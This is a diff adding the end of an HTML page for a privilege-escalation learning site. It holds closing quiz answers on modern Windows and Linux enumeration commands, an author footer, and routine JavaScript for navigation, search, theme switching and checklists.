+          <p>They inform exploitation strategy. A 🟢 reliable technique is worth trying first. A 🟡 environment-dependent one requires more setup and may fail. A 🔴 risky one (like a kernel exploit) can crash the system — use as a last resort.</p>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="accordion-header">9. What command replaces wmic for service enumeration on modern Windows?</div>
+        <div class="accordion-body">
+          <p><code>Get-CimInstance Win32_Service</code>. The <code>wmic</code> utility is deprecated since Windows 10 21H1 and removed from newer Windows 11 builds.</p>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="accordion-header">10. What commands replace ifconfig and netstat on modern Linux?</div>
+        <div class="accordion-body">
+          <p><code>ip addr</code> replaces <code>ifconfig</code>, and <code>ss -tulpn</code> replaces <code>netstat -tulpn</code>. These are part of the <code>iproute2</code> package, which is standard on modern distributions.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== AUTHOR FOOTER ==================== -->
+    <section class="section" id="author">
+      <div class="author-footer">
+        <h3>⚡ Built & Maintained By</h3>
+        <div class="author-name">Chandan Kumar</div>
+        <p class="tagline">
+          Cybersecurity enthusiast · Ethical Hacker · Pentester<br>
+          Creating practical, deep security learning resources for the community.
+        </p>
+        <div class="author-links">
+          <a href="https://linkedin.com/in/chandan-kumar-eh" target="_blank" rel="noopener" class="author-link linkedin">
+            <span class="icon">💼</span> LinkedIn
+          </a>
+          <a href="https://medium.com/@chandan20516" target="_blank" rel="noopener" class="author-link medium">
+            <span class="icon">✍️</span> Medium
+          </a>
+          <a href="https://github.com/chandan-44" target="_blank" rel="noopener" class="author-link github">
+            <span class="icon">🐙</span> GitHub
+          </a>
+        </div>
+        <p style="margin-top:1.5rem; font-size:0.8rem; color: var(--text-dim);">
+          © 2025 Chandan Kumar · Privilege Escalation Academy<br>
+          For authorized educational use only.
+        </p>
+      </div>
+    </section>
+
+    <!-- ==================== NAV BUTTONS ==================== -->
+    <div class="nav-buttons">
+      <button onclick="navigateSection('prev')">← Previous</button>
+      <button onclick="navigateSection('next')">Next →</button>
+    </div>
+
+  </div>
+
+  <button id="backToTop" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</button>
+
+  <script>
+    const themeToggle = document.getElementById('themeToggle');
+    const html = document.documentElement;
+
+    themeToggle.addEventListener('click', () => {
+      const current = html.getAttribute('data-theme');
+      const next = current === 'dark' ? 'light' : 'dark';
+      html.setAttribute('data-theme', next);
+      themeToggle.textContent = next === 'dark' ? '🌙 Dark' : '☀️ Light';
+    });
+
+    const navLinks = document.querySelectorAll('.nav-link');
+    const sections = document.querySelectorAll('.section');
+
+    navLinks.forEach(link => {
+      link.addEventListener('click', () => {
+        const targetId = link.getAttribute('data-target');
+        const target = document.getElementById(targetId);
+        if (target) {
+          target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+          navLinks.forEach(l => l.classList.remove('active'));
+          link.classList.add('active');
+          if (window.innerWidth <= 900) {
+            document.getElementById('sidebar').classList.remove('open');
+          }
+        }
+      });
+    });
+
+    const observer = new IntersectionObserver((entries) => {
+      entries.forEach(entry => {
+        if (entry.isIntersecting) {
+          const id = entry.target.id;
+          navLinks.forEach(link => {
+            link.classList.toggle('active', link.getAttribute('data-target') === id);
+          });
+        }
+      });
+    }, { threshold: 0.2 });
+
+    sections.forEach(section => observer.observe(section));
+
+    window.addEventListener('scroll', () => {
+      const scrollTop = window.scrollY;
+      const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+      const progress = (scrollTop / docHeight) * 100;
+      document.getElementById('progressBar').style.width = progress + '%';
+    });
+
+    window.addEventListener('scroll', () => {
+      const btn = document.getElementById('backToTop');
+      btn.style.display = window.scrollY > 400 ? 'flex' : 'none';
+    });
+
+    document.querySelectorAll('.accordion-header').forEach(header => {
+      header.addEventListener('click', () => {
+        header.parentElement.classList.toggle('open');
+      });
+    });
+
+    document.querySelectorAll('.tab-btn').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const tabId = btn.getAttribute('data-tab');
+        const parent = btn.closest('.tabs');
+        parent.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        const container = parent.parentElement;
+        container.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+        const target = document.getElementById(tabId);
+        if (target) target.classList.add('active');
+      });
+    });
+
+    function copyCode(btn) {
+      const codeBlock = btn.closest('.code-block');
+      const pre = codeBlock.querySelector('pre');
+      const text = pre.innerText;
+      navigator.clipboard.writeText(text).then(() => {
+        btn.textContent = '✓ Copied';
+        setTimeout(() => btn.textContent = 'Copy', 1500);
+      }).catch(() => {
+        const textarea = document.createElement('textarea');
+        textarea.value = text;
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textarea);
+        btn.textContent = '✓ Copied';
+        setTimeout(() => btn.textContent = 'Copy', 1500);
+      });
+    }
+
+    const searchInput = document.getElementById('searchInput');
+    searchInput.addEventListener('input', function() {
+      const query = this.value.toLowerCase().trim();
+      document.querySelectorAll('.highlight').forEach(el => {
+        const parent = el.parentNode;
+        parent.replaceChild(document.createTextNode(el.textContent), el);
+        parent.normalize();
+      });
+
+      if (query.length < 2) return;
+
+      const walker = document.createTreeWalker(
+        document.getElementById('main'),
+        NodeFilter.SHOW_TEXT,
+        null,
+        false
+      );
+
+      const textNodes = [];
+      while (walker.nextNode()) {
+        textNodes.push(walker.currentNode);
+      }
+
+      textNodes.forEach(node => {
+        const text = node.textContent;
+        const lower = text.toLowerCase();
+        const index = lower.indexOf(query);
+        if (index !== -1) {
+          const range = document.createRange();
+          range.setStart(node, index);
+          range.setEnd(node, index + query.length);
+          const span = document.createElement('span');
+          span.className = 'highlight';
+          range.surroundContents(span);
+        }
+      });
+    });
+
+    document.getElementById('menuToggle').addEventListener('click', () => {
+      document.getElementById('sidebar').classList.toggle('open');
+    });
+
+    function navigateSection(direction) {
+      const allSections = Array.from(document.querySelectorAll('.section'));
+      const currentScroll = window.scrollY;
+      let currentIndex = 0;
+      for (let i = 0; i < allSections.length; i++) {
+        if (allSections[i].offsetTop <= currentScroll + 100) {
+          currentIndex = i;
+        }
+      }
+      let nextIndex;
+      if (direction === 'next') {
+        nextIndex = Math.min(currentIndex + 1, allSections.length - 1);
+      } else {
+        nextIndex = Math.max(currentIndex - 1, 0);
+      }
+      allSections[nextIndex].scrollIntoView({ behavior: 'smooth' });
+    }
+
+    document.querySelectorAll('.checklist input[type="checkbox"]').forEach((cb, index) => {
+      const key = 'privesc-check-v4-' + index;
+      const saved = localStorage.getItem(key);
+      if (saved !== null) {
+        cb.checked = saved === 'true';
+      }
+      cb.addEventListener('change', () => {
+        localStorage.setItem(key, cb.checked);
+      });
+    });
+
+    document.querySelector('.accordion')?.classList.add('open');
+  </script>
+
+</body>
+</html>
